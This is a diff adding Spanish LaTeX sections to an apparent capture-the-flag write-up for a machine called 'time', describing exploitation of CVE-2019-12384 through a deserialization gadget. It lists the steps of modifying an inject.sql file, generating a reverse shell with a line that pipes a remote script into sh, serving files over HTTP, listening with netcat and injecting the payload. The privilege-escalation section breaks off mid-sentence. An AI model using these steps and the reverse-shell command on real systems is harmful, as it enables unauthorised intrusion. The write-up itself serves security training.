@@ -115,10 +115,68 @@ Con este código te bota el siguiente error:
 \end{lstlisting}
 
 Entonces el segundo error nos da algo más significativo, buscando en google encontramos algunas vulnerabilidades.
+
+Entre estas la que nos sirve es la que encontramos en este github \href{https://github.com/jas502n/CVE-2019-12384}{https://github.com/jas502n/CVE-2019-12384}
+
 \subsection{Explotación}
+Comenzando con la explotación, esta máquina utiliza un error de deserialización, el cual se explota con un gadget, en este caso lo que se tiene que hacer son los siguientes pasos: 
+\begin{enumerate}
+	\item Crear un inject.sql y modificarlo para que ejecute una reverse shell que queramos.
+	\item Crear la reverse shell que puede ser un archivo o escrita directamente.
+	\item Levantar estos archivos con un servidor para que sea accesible desde la máquina víctima.
+	\item Deja escuchando el puerto de la reverse shell.
+	\item escribir el exploit en la página para que se ejecute y nos de acceso.
+\end{enumerate} 
+
+Entonces empezamos con los pasos, primero para crear el inject.sql usamos el github que nos da el archivo, solo quedaría modificarlo con la ruta en la que tendríamos la reverse shell 
+
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/time/injection.png}
+	\caption{script de injection sql modificado}
+\end{figure}
+
+Luego para crear la reverse shell, podemos hacerlo de la forma habitual con monkey pentester, en este caso sabemos que lo va a ejecutar bash porque estamos en un server linux y esta función sql está llamando una shell de sistema, así que podríamos usar la reverse de bash, sin embargo para este caso usaremos un script que te genera varias reverse shell y te usa la más conveniente.
+
+El proceso para generarla es simple, solo te diriges a "https://resh.now.sh/\textbf{yourip}:1337 | sh", es importante este 1337 que sería el puerto que tendríamos que tener en escucha con el nc.
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/time/reverse_shell.png}
+	\caption{reverse shell}
+\end{figure}
+
+Luego tenemos que levantar un servidor en python para que pueda escuchar las peticiones de los archivos que necesitamos, en este la revershe shell y el injection.sql, el comando para esto es "python3 -m http.server \textbf{puerto a usar}", para este caso usaremos el 80 que se habilita con permisos de administrador, pero no es necesario puede ser cualquiera.
+
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/time/server.png}
+	\caption{servidor en python3}
+\end{figure}
+
+Levantamos en escucha un netcat en el puero 1337, y ejecutamos en la página el código malicioso que obtuvimos del github y hemos modificado.
+
+Hay que tener un poco de cuidado porque en el github escapan todas las comillas simples "", para esto simplemente quitas las barras invertidas.
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/time/comando.png}
+	\caption{Inyección de comando}
+\end{figure}
+\begin{figure}[H]
+	\center
+	\includegraphics[width=0.7\textwidth]{images/time/ejecucion.png}
+	\caption{Ejecución en el servidor}
+\end{figure}
+Con esto regresando al netcat podemos ver que ya tenemos acceso a la máquina, sin embargo estamos con un usuario poco privilegiado.
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/time/acceso.png}
+	\caption{Obteniendo acceso}
+\end{figure}
+
 
 \subsection{Escalamiento de privilegios}
 
+Ya dentro del usuario lo que tenemos que hacer es ver cuantos privilegios tenemos. Esto podemos hacerlo con un 
 
 \subsection{Post Explotación}
 
